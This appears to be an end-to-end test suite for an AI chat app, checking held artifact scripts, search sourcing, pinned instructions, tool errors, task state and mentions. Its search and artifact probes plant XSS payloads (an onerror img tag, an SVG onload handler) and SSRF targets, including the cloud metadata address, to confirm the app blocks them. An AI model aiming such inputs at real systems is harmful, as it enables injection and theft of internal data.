    held = re.match(r'Artifact #(\d+) "From notes" \(html\), version 1 saved\.\nNot checked: this page was written after content from outside the conversation', held_text)
    assert held, held_text
    hid = int(held.group(1))
    s.wait_for(lambda: (frame() or {}).get("key") == f"{hid}:1", 10, "the held page is shown")
    assert frame()["sandbox"] == "", frame()
    assert s.invoke("artifact_frame", {"chatId": chat2, "id": hid, "version": 1})["running"] == "held"
    panel = s.execute("return document.querySelector('aside[aria-label=\"Workbench\"]').innerText;")
    assert "its scripts are off" in panel and "Run scripts" in panel, panel[-500:]
    time.sleep(1.0)
    assert s.execute("return window.__held;") == [], "a held page ran its script"
    s.screenshot(str(OUT / "artifacts-held.png"))
    # The user allows it: the page is loaded again, with its scripts.
    s.click_button("Run scripts")
    s.wait_for(lambda: s.execute("return window.__held;") == [1], 10, "the page's script after Run scripts")
    assert frame()["sandbox"] == "allow-scripts", frame()
    assert "its scripts are off" not in s.execute("return document.querySelector('aside[aria-label=\"Workbench\"]').innerText;")
    # The next version is another page: it is held again.
    Fake.queue.append({"tool_calls": [{"name": "update_artifact", "arguments": {"id": hid, "content": after % 2}}]})
    Fake.queue.append({"content": "Changed."})
    s.click(s.find("textarea"))
    send(s, "change it")
    wait_idle(s)
    assert "Not checked: this page was written after" in tool_texts()[-1], tool_texts()[-1]
    s.wait_for(lambda: (frame() or {}).get("key") == f"{hid}:2", 10, "version 2 is shown")
    time.sleep(1.0)
    assert frame()["sandbox"] == "" and s.execute("return window.__held;") == [1], (frame(), s.execute("return window.__held;"))
    # A picture made in the same chat is drawn all the same: by the app's scripts, not its own.
    Fake.queue.append({"tool_calls": [{"name": "create_artifact", "arguments": {
        "title": "Dot", "kind": "svg",
        "content": "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"40\" height=\"40\" onload=\"parent.postMessage({source: 'held-probe', n: 3}, '*')\"><circle cx=\"20\" cy=\"20\" r=\"10\"/></svg>"}}]})
    Fake.queue.append({"content": "Drew it."})
    s.click(s.find("textarea"))
    send(s, "draw a dot")
    wait_idle(s)
    dot = tool_texts()[-1]
    notes.append("picture with a handler: " + dot.replace("\n", " | "))
    # The picture is drawn and checked; its handler is refused, and the model is told so.
    assert "The preview reported 1 problem:" in dot and "script-src" in dot, dot
    s.wait_for(lambda: (frame() or {}).get("sandbox") == "allow-scripts", 10, "the picture's frame")
    assert in_frame("return document.querySelectorAll('svg circle').length;") == 1, "the picture was not drawn"
    time.sleep(0.8)
    assert s.execute("return window.__held;") == [1], "a handler inside a picture ran"


@probe("search")
def p_search(c, notes):
    """Web search with sources that can be checked (0.0.4). The search goes to the service
    the user chose: here a stand-in for a SearXNG instance on this computer. The pages it
    names are on this computer or on a private network, so the app refuses to read them
    without connecting, says so, and gives the model the service's summaries. An answer's
    [n] is a chip that opens the source in the panel; a number with no source is marked.
    Nothing a search returns is drawn as markup."""
    from urllib.parse import parse_qs, urlsplit
    s = c.s

    class Searx(BaseHTTPRequestHandler):
        seen = []
        results = []

        def log_message(self, *a):
            pass

        def do_GET(self):
            Searx.seen.append(self.path)
            url = urlsplit(self.path)
            query = parse_qs(url.query)
            if url.path == "/search" and query.get("format") == ["json"]:
                body = json.dumps({"query": query.get("q", [""])[0], "number_of_results": len(Searx.results),
                                   "results": Searx.results}).encode()
                kind = "application/json"
            else:
                body = b"<html><body><p>A page on this computer. The app must never read it.</p></body></html>"
                kind = "text/html; charset=utf-8"
            self.send_response(200)
            self.send_header("Content-Type", kind)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    port = free_port()
    base = f"http://127.0.0.1:{port}"
    Searx.results = [
        {"title": "Heron migration routes", "url": f"{base}/pages/routes", "engine": "stand-in",
         "content": "Grey herons from the north fly south in autumn and return in early spring."},
        {"title": "Ringing records", "url": f"http://localhost:{port}/pages/ringing", "engine": "stand-in",
         "content": "Ringed birds were found up to 2,000 km from the nest."},
        {"title": "Field notes <img src=x onerror=\"window.__searchPwned=1\">", "url": "http://10.0.0.7/wiki/herons",
         "engine": "stand-in", "content": "Notes kept on <b>our</b> network."},
        {"title": "Instance data", "url": "http://169.254.169.254/latest/meta-data/", "engine": "stand-in",
         "content": "What a cloud machine can ask about itself."},
    ]
    server = ThreadingHTTPServer(("127.0.0.1", port), Searx)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    before = s.invoke("get_search_settings")
    notes.append("settings before: " + json.dumps(before))
    workbench = 'aside[aria-label="Workbench"]'

    def tool_results(chat_id):
        return [m["toolResult"]["text"] for m in messages(s, chat_id) if m["role"] == "tool"]

    try:
        # ---- The service is chosen through the settings command, as the Settings screen does.
        saved = s.invoke("set_search_settings", {"settings": {"provider": "searxng", "searxngUrl": base, "pages": 4,
                                                               "versionMatching": True}})
        assert saved["provider"] == "searxng" and saved["searxngUrl"].rstrip("/") == base, saved
        # A key is kept in the keychain: what comes back says only that one is set, and it
        # is not written to the database.
        secret = "BSA-e2e-0123456789-key"
        with_key = s.invoke("set_search_key", {"provider": "brave", "key": secret})
        assert with_key["braveKeySet"] is True and secret not in json.dumps(with_key), with_key
        assert secret not in json.dumps(s.invoke("get_search_settings"))
        for name in ("app.db", "app.db-wal"):
            f = c.db.with_name(name)
            assert not f.exists() or secret.encode() not in f.read_bytes(), f"the key is in {name}"
        assert s.invoke("clear_search_key", {"provider": "brave"})["braveKeySet"] is False

        # ---- The Settings screen shows the choice, says where requests go, and can try it.
        s.click_button("Settings")
        tab = s.wait_for(lambda: s.execute(
            "return [...document.querySelectorAll('[role=tab]')].find(b => b.innerText.trim() === 'Search') || false;"),
            10, "the Search tab in Settings")
        s.click(next(iter(tab.values())))
        s.wait_text("Search service", 10)
        page = s.page_text()
        assert "the search is sent to the service chosen here, and the pages it finds are then fetched from their own sites" in page, page[-800:]
        chosen = s.execute("return [...document.querySelectorAll('[role=radio][aria-checked=true]')].map(b => b.innerText);")
        assert len(chosen) == 1 and "SearXNG" in chosen[0], chosen
        assert s.execute("return document.getElementById('searxng-address').value;").rstrip("/") == base
        s.click_button("Test search")
        s.wait_text("SearXNG answered with 4 results.", 20)
        assert "Heron migration routes · 127.0.0.1" in s.page_text()
        assert [urlsplit(p).path for p in Searx.seen] == ["/search"], Searx.seen
        assert "Something went wrong" not in s.page_text()
        s.screenshot(str(OUT / "search-settings.png"))
        s.execute("document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));")
        time.sleep(0.4)

        # ---- A search by the model asks first and says where it goes.
        chat = new_chat(c, tools=["web_search", "read_source"])
        Searx.seen.clear()
        Fake.requests.clear()
        Fake.queue.append({"tool_calls": [{"name": "web_search", "arguments": {"query": "how do herons migrate"}}]})
        Fake.queue.append({"content": 'Grey herons from the north "fly south in autumn and return in early spring" [1]. '
                                      'Some "spend the whole winter far out on the open sea" [1], '
                                      "and every one of them sleeps until May [9]."})
        send(s, "how do herons migrate?")
        s.wait_for(lambda: "Allow once" in s.page_text(), 30, "approval card")
        card = s.page_text()
        assert "how do herons migrate" in card and f"your SearXNG instance at 127.0.0.1:{port}" in card, card[-700:]
        assert "Up to 4 of the pages it finds are then read from their sites." in card, card[-700:]
        assert Searx.seen == [], "the search was sent before it was allowed"
        time.sleep(0.9)
        s.click_button("Allow once")
        wait_idle(s)

        # ---- The result: numbered hits with the service's summaries, and why no page was read.
        result = tool_results(chat)[-1]
        notes.append("web_search result: " + result.replace("\n", " | "))
        lines = result.split("\n")
        assert lines[0] == "Sources [1] [2] [3] [4] for: how do herons migrate", lines[0]
        assert lines[1] == "None of the pages could be read, so only the search service's summaries are given.", lines[1]
        assert (f"\n[1] Heron migration routes — 127.0.0.1\n{base}/pages/routes\n"
                "(This page could not be read: 127.0.0.1 is a loopback (this computer) address (127.0.0.1), "
                "and pages are never read from there. The search service's summary:)\n"
                "Grey herons from the north fly south in autumn and return in early spring.\n") in result, result
        assert "\n[2] Ringing records — localhost\n" in result, result
        assert "localhost is this computer, and pages are never read from there" in result, result
        assert "10.0.0.7 is a private network address (10.0.0.7), and pages are never read from there" in result, result
        assert "169.254.169.254 is a link-local address (169.254.169.254), and pages are never read from there" in result, result
        assert result.count("(This page could not be read: ") == 4, result
        assert result.rstrip().endswith("Cite a source as [n] right after the sentence it supports. "
                                        "Use only what the excerpts say; if they do not answer the question, say so."), result[-300:]
        # The model was sent that text as tool output (data, inside the delimiter), and only
        # the search itself reached the stand-in.
        sent = [m["content"] for m in Fake.requests[-1]["messages"] if m["role"] == "tool"][-1]
        sent = sent if isinstance(sent, str) else json.dumps(sent)
        notes.append("as sent to the model: " + sent[:260].replace("\n", " | ") + " … " + sent[-190:].replace("\n", " | "))
        assert sent.startswith("<tool_output ") and 'tool="web_search"' in sent.split("\n", 1)[0], sent[:300]
        assert result in sent, sent
        assert len(Searx.seen) == 1, f"a page on this computer was asked for: {Searx.seen}"
        asked = urlsplit(Searx.seen[0])
        assert asked.path == "/search" and parse_qs(asked.query) == {"q": ["how do herons migrate"], "format": ["json"]}, Searx.seen

        # ---- Each hit is stored under its number, with what the model was given of it.
        sources = s.invoke("list_sources", {"chatId": chat})
        assert [x["n"] for x in sources] == [1, 2, 3, 4], sources
        assert all(x["excerpt"] == "" and x["fetchedAt"] is None and x["contentSha256"] is None and x["snippet"] for x in sources), sources
        assert sources[0]["url"] == f"{base}/pages/routes" and sources[0]["queries"] == ["how do herons migrate"], sources[0]
        assert sources[0]["snippet"] == "Grey herons from the north fly south in autumn and return in early spring.", sources[0]

        # ---- In the answer, [1] is a chip and [9] is marked as having no source.
        s.wait_for(lambda: s.execute("return document.querySelectorAll('button[data-citation=\"1\"]').length;") == 2, 15,
                   "the chips for [1]")
        chip = s.execute("const b = document.querySelector('button[data-citation=\"1\"]');"
                         "return {text: b.innerText.trim(), title: b.getAttribute('title')};")
        assert chip == {"text": "1", "title": "Heron migration routes — 127.0.0.1"}, chip
        missing = s.execute("const e = document.querySelector('[data-citation-missing=\"9\"]');"
                            "return e ? {text: e.innerText, title: e.getAttribute('title'), tag: e.tagName} : null;")
        assert missing == {"text": "[9]", "title": "No such source", "tag": "SPAN"}, missing
        assert s.execute("return document.querySelector('button[data-citation=\"9\"]') === null;")
        # The card of the search lists what it found.
        hits = s.execute("return [...document.querySelectorAll('ul[aria-label=\"Sources found\"] button')]"
                         ".map(b => b.innerText.replace(/\\s+/g, ' ').trim());")
        assert len(hits) == 4 and hits[0].startswith("1 Heron migration routes") and "127.0.0.1" in hits[0], hits

        # ---- The chip opens the Sources tab on that source, with the quote check.
        s.click(s.find('button[data-citation="1"]'))
        s.wait_for(lambda: s.execute("return !!document.querySelector(arguments[0] + ' article[data-source=\"1\"]');", workbench),
                   10, "the Sources tab on source 1")
        tab = s.execute("const t = document.querySelector(arguments[0] + ' [role=tab][aria-selected=true]');"
                        "return t ? t.innerText.trim() : null;", workbench)
        assert tab == "Sources", tab
        shown = s.execute("return document.querySelector(arguments[0] + ' article[data-source=\"1\"]').innerText;", workbench)
        assert f"{base}/pages/routes" in shown and "how do herons migrate" in shown, shown
        assert "Grey herons from the north fly south in autumn and return in early spring." in shown, shown
        assert "not read: the model was given only the search service's summary" in shown, shown
        quotes = s.execute("return [...document.querySelectorAll(arguments[0] + ' article[data-source=\"1\"] [data-quote-found]')]"
                           ".map(e => [e.getAttribute('data-quote-found'), e.innerText.replace(/\\s+/g, ' ').trim()]);", workbench)
        notes.append("quote check: " + json.dumps(quotes))
        assert len(quotes) == 2, quotes
        assert quotes[0][0] == "true" and "fly south in autumn and return in early spring" in quotes[0][1] and quotes[0][1].endswith("quote found"), quotes
        assert quotes[1][0] == "false" and quotes[1][1].endswith("quote not found in the retrieved text"), quotes
        assert s.execute("return document.querySelectorAll(arguments[0] + ' article[data-source]').length;", workbench) == 4
        # What a search returns is text: markup in a title is shown, not drawn.
        third = s.execute("return document.querySelector(arguments[0] + ' article[data-source=\"3\"] h3').innerText;", workbench)
        assert "<img src=x onerror=" in third, third
        assert s.execute("return window.__searchPwned === undefined && document.querySelector('img[src=\"x\"]') === null;"), \
            "markup from a search result was drawn"
        s.screenshot(str(OUT / "search-sources.png"))

        # ---- Reading a source again is refused the same way, without a request.
        Searx.seen.clear()
        Fake.queue.append({"tool_calls": [{"name": "read_source", "arguments": {"n": 1}}]})
        Fake.queue.append({"content": "That page could not be read."})
        send(s, "read the first one")
        s.wait_for(lambda: "Allow once" in s.page_text(), 30, "approval card")
        assert "Read more of source [1]" in s.page_text(), s.page_text()[-600:]
        time.sleep(0.9)
        s.click_button("Allow once")
        wait_idle(s)
        again = tool_results(chat)[-1]
        notes.append("read_source result: " + again.replace("\n", " | "))
        assert again.startswith("Source [1] could not be read: 127.0.0.1 is a loopback (this computer) address (127.0.0.1), "
                                "and pages are never read from there."), again
        assert Searx.seen == [], f"a page on this computer was asked for: {Searx.seen}"
        audit = [(a["tool"], a["decision"]) for a in s.invoke("list_audit", {"filter": {"chatId": chat}})]
        notes.append("audit: " + json.dumps(audit))
        assert ("web_search", "allow_once") in audit and ("read_source", "allow_once") in audit, audit
    finally:
        s.invoke("set_search_settings", {"settings": {k: before[k] for k in ("provider", "searxngUrl", "pages", "versionMatching")}})
        server.shutdown()


@probe("pinned")
def p_pinned(c, notes):
    """Pinned instructions (0.0.4): pinned in the Context tab for this chat and for every
    chat, sent right after the system prompt; another chat gets only the one for every chat;
    still listed after a reload."""
    s = c.s
    own_text = "Use metric units in every answer."
    every_text = "Answer in German."
    aside = 'aside[aria-label="Workbench"]'

    def open_context_tab():
        s.wait_for(lambda: s.execute("return !!document.querySelector('button[aria-label=\"Panel\"]');"), 10, "the panel button")
        if not s.execute(f"return !!document.querySelector('{aside}');"):
            s.click_button("Panel")
        s.wait_for(lambda: s.execute(f"return !!document.querySelector('{aside}');"), 10, "the panel")
        s.execute(f"[...document.querySelectorAll('{aside} [role=tab]')].find(b => b.innerText.includes('Context')).click();")
        s.wait_for(lambda: s.execute(f"return !!document.querySelector('{aside} [data-pin-count]');"), 10, "the pinned list")

    def listed():
        return s.execute(f"return [...document.querySelectorAll('{aside} li[data-pin]')].map(li => [li.dataset.scope, li.querySelector('[data-pin-text]').innerText]);")

    def pin(text, every_chat):
        s.execute(
            f"""
            const box = document.querySelector('{aside} textarea[aria-label="New pinned instruction"]');
            Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set.call(box, arguments[0]);
            box.dispatchEvent(new Event('input', {{bubbles: true}}));
            const radio = [...document.querySelectorAll('{aside} input[name="pin-scope"]')][arguments[1] ? 1 : 0];
            radio.click();
            """, text, every_chat)
        time.sleep(0.3)
        counter = s.execute(f"return document.querySelector('{aside} #new-pin-count').innerText;")
        assert counter.startswith(f"{len(text)} of 1,000 characters"), counter
        s.execute(f"[...document.querySelectorAll('{aside} button')].find(b => b.innerText === 'Pin it').click();")
        s.wait_for(lambda: any(t == text for _, t in listed()), 10, f"the pin {text!r} listed")

    def system_of(marker):
        reqs = [r for r in Fake.requests if marker in json.dumps(r.get("messages", []))]
        assert reqs, f"no request carried {marker!r}"
        return reqs[0]["messages"][0]["content"], json.dumps(reqs[0])

    chat_a = new_chat(c)
    s.invoke("rename_chat", {"chatId": chat_a, "title": "Pinned A"})
    open_context_tab()
    assert "0 of 20" in s.execute(f"return document.querySelector('{aside} [data-pin-count]').innerText;")
    assert "do not put passwords or keys" in s.execute(f"return document.querySelector('{aside}').innerText;")
    pin(own_text, False)
    pin(every_text, True)
    assert listed() == [["every", every_text], ["chat", own_text]], listed()
    assert "2 of 20" in s.execute(f"return document.querySelector('{aside} [data-pin-count]').innerText;")
    s.screenshot(str(OUT / "pinned-context-tab.png"))

    # A turn in this chat: both pins, after the system prompt, before anything else.
    Fake.requests.clear()
    Fake.queue.append({"content": "Gut."})
    send(s, "first chat question")
    wait_idle(s)
    system, _ = system_of("first chat question")
    block = ("<pinned_instructions>\nThe user pinned these instructions. Follow them in every reply:\n"
             f"1. {every_text}\n2. {own_text}\n</pinned_instructions>")
    assert system.count(block) == 1, system[:800]
    before = system.split("<pinned_instructions>")[0]
    notes.append("system prompt before the pins: " + before.strip()[:80])
    assert before.strip() and "<" not in before, before[:300]
    if "<agent_instructions>" in system:
        assert system.index(block) < system.index("<agent_instructions>")

    # Another chat: only the pin for every chat.
    chat_b = new_chat(c)
    Fake.requests.clear()
    Fake.queue.append({"content": "Ja."})
    send(s, "second chat question")
    wait_idle(s)
    system, whole = system_of("second chat question")
    assert f"1. {every_text}\n</pinned_instructions>" in system, system[:800]
    assert own_text not in whole, "the other chat's pin was sent"
    assert [p["text"] for p in s.invoke("list_pins", {"chatId": chat_b})["pins"]] == [every_text]

    # After a reload the pins of chat A are still listed.
    s.execute("window.location.reload();")
    time.sleep(1.5)
    s.wait_for(lambda: "Pinned A" in s.page_text(), 20, "sidebar after reload")
    s.execute(HOOK)
    s.execute("[...document.querySelectorAll('nav[aria-label=\"Chat history\"] button')].find(b => b.innerText.includes('Pinned A')).click();")
    time.sleep(0.8)
    open_context_tab()
    s.wait_for(lambda: len(listed()) == 2, 10, "the pins after the reload")
    assert listed() == [["every", every_text], ["chat", own_text]], listed()
    # Leave no pin for every chat behind for the probes that follow.
    for p in s.invoke("list_pins", {"chatId": chat_a})["pins"]:
        s.invoke("remove_pin", {"chatId": chat_a, "id": p["id"]})
    s.click_button("Panel")


@probe("tool-errors-output")
def p_tool_errors_output(c, notes):
    """Owner items 7 and 8 (0.0.4): a failing edit says why and how to fix it, and a long
    result is shortened with a line that says how to read the rest."""
    import re
    s = c.s
    files = ["read_file", "list_dir", "search_files", "write_file", "edit_file"]
    chat = new_chat(c, tools=[t for t in files if t in c.all_tools])
    folder = c.work / "errors-output"
    shutil.rmtree(folder, ignore_errors=True)
    folder.mkdir()
    calc = folder / "calc.py"
    calc.write_text("def price(qty):\n    total = 2 * qty\n    return total\n\n\ndef tax(qty):\n    total = 2 * qty\n    return total * 0.2\n")
    big = folder / "big.txt"
    big.write_text("".join(f"row {i}: value {i * 7}\n" if i % 1500 else f"row {i}: needle {i}\n" for i in range(1, 6001)))

    def tool_message(req):
        return [m for m in req.get("messages", []) if m.get("role") == "tool"][-1]["content"]

    def last_result():
        return [m for m in messages(s, chat) if m["role"] == "tool"][-1]["toolResult"]

    # 1. An ambiguous edit. Explaining it needs the file's lines, so the app asks to read
    #    the file (a read card, not an edit card) and answers with the matches as data.
    Fake.queue.append({"tool_calls": [{"name": "edit_file", "arguments": {
        "path": str(calc), "old_text": "    total = 2 * qty", "new_text": "    total = 3 * qty"}}]})
    Fake.queue.append({"tool_calls": [{"name": "edit_file", "arguments": {
        "path": str(calc), "old_text": "    total = 2 * qty", "new_text": "    total = 3 * qty", "occurrence": 2}}]})
    Fake.queue.append({"content": "The tax total is changed."})
    Fake.requests.clear()
    send(s, "make the tax total three times the quantity")
    s.wait_for(lambda: "Allow once" in s.page_text(), 30, "the read card for the failed edit")
    card = s.page_text()
    assert "to explain why an edit cannot be made" in card, card[-600:]
    assert "Nothing will be changed." in card, card[-600:]
    s.screenshot(str(OUT / "tool-errors-read-card.png"))
    time.sleep(0.9)
    s.click_button("Allow once")
    # 2. The edit with occurrence: an edit card, then the change.
    s.wait_for(lambda: "Allow once" in s.page_text() and len(Fake.requests) >= 2, 30, "the edit card")
    card = s.page_text()
    assert "match 2 of 2, at line 7" in card, card[-600:]
    time.sleep(0.9)
    s.click_button("Allow once")
    wait_idle(s)
    assert calc.read_text().count("total = 3 * qty") == 1 and "    total = 3 * qty\n    return total * 0.2" in calc.read_text(), calc.read_text()
    seen = tool_message(Fake.requests[1])
    notes.append("model saw: " + seen.replace("\n", " | ")[:700])
    assert "Matches:\nline 2:     total = 2 * qty\nline 7:     total = 2 * qty\n" in seen, seen
    assert "occurrence (1 to 2, counted from the top)" in seen, seen
    # Inside the untrusted-data markers, as an error result, and not as an app note.
    head = seen.split("\n", 1)[0]
    assert head.startswith("<") and 'tool="edit_file"' in head and 'status="error"' in head, head
    assert "[App note]" not in seen, seen
    assert "Edited " in tool_message(Fake.requests[2]), tool_message(Fake.requests[2])

    # 3. A long read is shortened, saved, and names how to read more.
    Fake.queue.append({"tool_calls": [{"name": "read_file", "arguments": {"path": str(big)}}]})
    Fake.queue.append({"content": "It is long."})
    send(s, "read big.txt")
    answer_card(s, "Allow for this chat")
    wait_idle(s)
    text = last_result()["text"]
    last = text.rstrip().split("\n")[-1]
    notes.append("shortened line: " + last)
    m = re.fullmatch(r'\[Shortened: (\d+) of 6000 lines shown\. Full output is saved as output #(\d+)\. '
                     r'Read more with read_output \{"id": (\d+), "lines": "(\d+)-(\d+)"\} or \{"id": (\d+), "grep": "text"\}\.\]', last)
    assert m, last
    shown, oid = int(m.group(1)), int(m.group(2))
    assert m.group(3) == m.group(6) == str(oid) and int(m.group(4)) == shown + 1, last
    saved = s.invoke("get_tool_output", {"chatId": chat, "id": oid})
    assert saved["text"] == big.read_text() and saved["lines"] == 6000, {k: v for k, v in saved.items() if k != "text"}
    other = s.invoke("create_chat", {"modelRef": c.model_ref})["id"]
    try:
        s.invoke("get_tool_output", {"chatId": other, "id": oid})
        raise AssertionError("another chat read the saved output")
    except WebDriverError as e:
        assert '"code": "not_found"' in str(e), e
    s.invoke("delete_chat", {"chatId": other})

    # 4. read_output with grep: the matching lines, with no card.
    Fake.queue.append({"tool_calls": [{"name": "read_output", "arguments": {"id": oid, "grep": "needle", "context": 1}}]})
    Fake.queue.append({"content": "Found them."})
    send(s, "where are the needles")
    time.sleep(0.4)
    deadline = time.time() + 60
    while not idle(s):
        assert "Allow once" not in s.page_text(), "read_output asked for approval"
        assert time.time() < deadline, "the turn did not finish"
        time.sleep(0.2)
    found = last_result()["text"]
    notes.append("grep: " + found.replace("\n", " | ")[:400])
    assert found.startswith(f'4 lines of output #{oid} contain "needle"'), found[:300]
    for n in (1500, 3000, 4500, 6000):
        assert f"{n:>6}: row {n}: needle {n}" in found, (n, found)
    seen = tool_message(Fake.requests[-1])
    assert seen.startswith("<") and 'tool="read_output"' in seen.split("\n", 1)[0], seen[:200]

    # 5. The read_file card offers the full output, opened in the card.
    s.wait_for(lambda: s.execute("return [...document.querySelectorAll('button')].some(b => b.innerText.trim() === 'Full output');"), 10, "the Full output button")
    s.execute("[...document.querySelectorAll('button')].find(b => b.innerText.trim() === 'Full output').click();")
    s.wait_for(lambda: s.execute(f"const p = document.querySelector('pre[aria-label=\"Output #{oid}\"]'); return !!p && p.textContent.includes('row 5999: value 41993');"), 10, "the full output in the card")
    s.screenshot(str(OUT / "tool-errors-full-output.png"))


@probe("task-state")
def p_task_state(c, notes):
    """Visible, resumable task state (0.0.4): a scripted update_task sets the goal and
    steps, a write_file shows under changed files, an ordinary follow-up turn carries no
    task note, Pause during a streamed reply stops it, the task survives a reload, and
    Resume sends the continue message with the task note, which is in the request once."""
    s = c.s
    aside = 'aside[aria-label="Workbench"]'
    header = "Task state, from the app's record of the work in this chat."
    goal = "Put a dark mode switch in the header"
    tools = [t for t in ["read_file", "write_file", "update_task"] if t in c.all_tools]
    chat = new_chat(c, tools=tools)
    s.invoke("rename_chat", {"chatId": chat, "title": "Task state"})
    folder = c.work / "task-state"
    shutil.rmtree(folder, ignore_errors=True)
    folder.mkdir()
    target = folder / "Switch.tsx"

    def open_task_tab():
        s.wait_for(lambda: s.execute("return !!document.querySelector('button[aria-label=\"Panel\"]');"), 10, "the panel button")
        if not s.execute(f"return !!document.querySelector('{aside}');"):
            s.click_button("Panel")
        s.wait_for(lambda: s.execute(f"return !!document.querySelector('{aside}');"), 10, "the panel")
        s.execute(f"[...document.querySelectorAll('{aside} [role=tab]')].find(b => b.innerText.trim().startsWith('Task')).click();")

    def tab_text():
        return s.execute(f"const a = document.querySelector('{aside}'); return a ? a.innerText : '';")

    def status():
        return s.execute(f"const e = document.querySelector('{aside} [data-task-status]'); return e ? e.dataset.taskStatus : null;")

    def press(label):
        s.execute(f"[...document.querySelectorAll('{aside} button')].find(b => b.innerText.trim() === arguments[0]).click();", label)

    def user_text(req):
        users = [m for m in req.get("messages", []) if m.get("role") == "user"]
        content = users[-1]["content"] if users else ""
        return content if isinstance(content, str) else json.dumps(content)

    # 1. The model records the task, then writes a file (the card is answered).
    Fake.requests.clear()
    Fake.queue.append({"tool_calls": [{"name": "update_task", "arguments": {
        "goal": goal,
        "steps": [{"text": "Read the header", "status": "done"}, {"text": "Add the switch", "status": "doing"},
                  {"text": "Run the tests"}],
        "next_action": "Add the switch to the header"}}]})
    Fake.queue.append({"tool_calls": [{"name": "write_file", "arguments": {
        "path": str(target), "content": "export const Switch = () => null;\n"}}]})
    Fake.queue.append({"content": "The switch file is written."})
    send(s, "add a dark mode switch")
    answer_card(s, "Allow once")
    wait_idle(s)
    assert target.exists(), "the file was not written"
    assert "[App note] Task state" not in json.dumps(Fake.requests[0]), "a note was sent before there was a task"
    seen = [m for m in Fake.requests[1]["messages"] if m.get("role") == "tool"][-1]["content"]
    notes.append("update_task result: " + seen.replace("\n", " | ")[:300])
    assert "Task saved." in seen and goal in seen, seen

    # 2. The tab shows the goal, the steps and the changed file.
    open_task_tab()
    s.wait_for(lambda: goal in tab_text() and "Switch.tsx" in tab_text(), 10, "the task in the tab")
    text = tab_text()
    assert "Add the switch" in text and "Run the tests" in text, text[:800]
    assert status() == "active", status()
    path = s.execute(f"const b = document.querySelector('{aside} [data-path]'); return b ? b.dataset.path : null;")
    assert path == str(target.resolve()), path
    s.screenshot(str(OUT / "task-state-tab.png"))

    # 3. A slow reply; Pause stops it and the task shows paused.
    Fake.requests.clear()
    Fake.queue.append({"content": "Working on the switch now. " * 30, "delay": 0.05, "chunk": 8})
    send(s, "go on with it")
    s.wait_for(lambda: not idle(s), 10, "the reply streaming")
    time.sleep(0.6)
    press("Pause")
    wait_idle(s, 30)
    s.wait_for(lambda: status() == "paused", 10, "the paused status")
    assert "Paused" in tab_text()
    assert s.invoke("get_task", {"chatId": chat})["status"] == "paused"
    assert len(Fake.requests) == 1, len(Fake.requests)
    # Nothing changed since the model recorded the task in this conversation: an ordinary
    # follow-up turn carries no task note (its cached prompt stays valid).
    follow_up = json.dumps(Fake.requests[0].get("messages", []))
    assert "go on with it" in follow_up
    assert "Task state, from the app" not in follow_up, user_text(Fake.requests[0])[-900:]
    reply = [m for m in messages(s, chat) if m["role"] == "assistant"][-1]["text"]
    assert len(reply) < len("Working on the switch now. " * 30), "the reply was not stopped"

    # 4. After a reload the tab still shows the task, paused, with Resume.
    s.execute("window.location.reload();")
    time.sleep(1.5)
    s.wait_for(lambda: "Task state" in s.page_text(), 20, "sidebar after reload")
    s.execute(HOOK)
    s.execute("[...document.querySelectorAll('nav[aria-label=\"Chat history\"] button')].find(b => b.innerText.includes('Task state')).click();")
    time.sleep(0.8)
    open_task_tab()
    s.wait_for(lambda: goal in tab_text() and "Switch.tsx" in tab_text(), 10, "the task after the reload")
    assert status() == "paused", status()

    # 5. Resume sends the continue message; the request carries the task note, once.
    Fake.requests.clear()
    Fake.queue.append({"content": "Continuing with the switch."})
    press("Resume")
    wait_idle(s)
    assert Fake.requests, "Resume sent nothing"
    req = Fake.requests[0]
    last = user_text(req)
    notes.append("task note: " + last.split("[App note] ", 1)[-1].replace("\n", " | ")[:900])
    assert "Continue the task. Start with the next action." in last, last[-900:]
    assert header in last, last[-900:]
    assert f'goal: "{goal}"' in last, last[-900:]
    assert "paused this task and has now resumed it" in last, last[-900:]
    assert 'created "Switch.tsx"' in last or "Switch.tsx" in last, last[-900:]
    assert 'next action: "Add the switch to the header"' in last, last[-900:]
    whole = json.dumps(req.get("messages", []))
    assert whole.count("Task state, from the app") == 1, whole.count("Task state, from the app")
    s.wait_for(lambda: status() == "active", 10, "the active status")
    # A change made elsewhere reaches the open tab through the change event.
    s.invoke("edit_task", {"chatId": chat, "edit": {"nextAction": "Check the footer too"}})
    s.wait_for(lambda: "Check the footer too" in tab_text(), 10, "the tab refreshed by the event")
    assert "written by you" in tab_text()
    s.click_button("Panel")


@probe("mentions")
def p_mentions(c, notes):
    """Typing @ lists files and definitions of the approved folders; a chosen definition is
    sent to the model with its path and lines; a path outside the folders is refused."""
    s = c.s
    folder = c.work / "mentions"
    folder.mkdir(exist_ok=True)
    (folder / "notes.txt").write_text("the secret word is heron\n")
    calc = folder / "calc.py"
    calc.write_text("def add(a, b):\n    return a + b\n\n\ndef sub(a, b):\n    return a - b\n")
    chat = new_chat(c)
    # Approved for this chat (the picker is native), and its working folder.
    con = sqlite3.connect(c.db)
    con.execute("INSERT INTO approved_folders(path, chat_id, created_at) VALUES (?, ?, ?)", (str(folder), chat, int(time.time() * 1000)))
    con.commit()
    con.close()
    s.invoke("set_chat_working_folder", {"chatId": chat, "path": str(folder)})
    s.execute("window.location.reload();")
    time.sleep(1.5)
    s.execute(HOOK)
    s.execute(
        """
        const a = [...document.querySelectorAll('nav[aria-label="Chat history"] button')].find(b => b.innerText.includes('New chat'));
        a && a.click();
        """
    )
    time.sleep(0.6)
    # The picker lists the definition, as a name with its file and line.
    box = s.find("textarea")
    s.type(box, "What does @add")
    option_text = "return [...document.querySelectorAll('[role=listbox] [role=option]')].map(o => o.innerText).join(' | ');"
    s.wait_for(lambda: "add" in (s.execute(option_text) or ""), 20, "the add definition in the picker")
    shown = s.execute(option_text)
    notes.append("picker: " + shown.replace("\n", " "))
    assert "calc.py:1" in shown and "function" in shown, shown
    s.screenshot(str(OUT / "mentions-picker.png"))
    # Enter chooses it: the mention goes into the text and a chip appears under the box.
    s.type(box, "\ue007")
    s.wait_for(lambda: "@calc.py#add" in s.execute("return document.querySelector('textarea').value;"), 10, "the mention in the text")
    s.type(box, "do?")
    chips = s.execute("const l = document.querySelector('ul[aria-label=\"Mentions\"]'); return l ? l.innerText : '';")
    assert "calc.py#add" in chips, chips
